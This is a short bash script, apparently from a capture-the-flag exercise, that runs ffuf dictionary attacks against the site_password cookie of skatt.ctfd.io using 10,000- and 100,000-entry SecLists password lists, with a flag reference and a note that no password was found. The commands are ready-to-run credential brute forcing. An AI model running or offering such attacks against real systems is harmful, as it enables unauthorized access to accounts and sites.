#!/bin/bash
# ============================================================
# Script 03 — ffuf Dictionary Attack
# Target: https://skatt.ctfd.io
# Tool: ffuf v2.1.0-dev
# Description: Fuzzes the site_password cookie using SecLists
# ============================================================

# Prerequisites:
# brew install ffuf
# git clone https://github.com/danielmiessler/SecLists.git ~/SecLists

# ------------------------------------------------------------
# Attack 1 — 10,000 most common passwords
# Duration: ~32 seconds | Speed: ~312-373 req/sec
# ------------------------------------------------------------
ffuf -u https://skatt.ctfd.io/ \
  -b "site_password=FUZZ" \
  -w ~/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  -fc 401

# Result: 0 hits — all 10,000 returned 401

# ------------------------------------------------------------
# Attack 2 — 100,000 most used passwords (escalation)
# Run this if Attack 1 finds nothing
# ------------------------------------------------------------
ffuf -u https://skatt.ctfd.io/ \
  -b "site_password=FUZZ" \
  -w ~/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt \
  -fc 401

# ------------------------------------------------------------
# ffuf flag reference:
# -u     Target URL
# -b     Cookie header (FUZZ = placeholder replaced by wordlist)
# -w     Path to wordlist
# -fc    Filter by status code (hide these responses)
# -fs    Filter by response size (useful to hide false positives)
# -t     Number of threads (default 40)
# ------------------------------------------------------------

# ------------------------------------------------------------
# How to interpret results:
# 401 = Wrong password (filtered out, not shown)
# 200 = Correct password (would be shown — never achieved)
# ------------------------------------------------------------
